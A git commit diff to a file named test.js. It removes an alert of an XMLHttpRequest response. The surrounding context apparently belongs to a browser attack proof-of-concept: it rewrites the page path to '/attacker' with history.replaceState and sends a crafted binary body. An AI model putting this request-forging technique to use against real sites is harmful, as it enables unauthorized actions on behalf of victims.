06b985085c141be25f4a9ceb111e5d054e4486bc
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-03 02:32:21 +0100

    Update test.js

--- assets/javascript/test.js
+++ assets/javascript/test.js
@@ -11,7 +11,6 @@ xhr.onreadystatechange = function() {
 		aBody[i] = body.charCodeAt(i);
 	window.history.replaceState(null, '', '/attacker');
 	xhr.send(new Blob([aBody]));
-	alert(xhr.responseText);
     }
 }
 
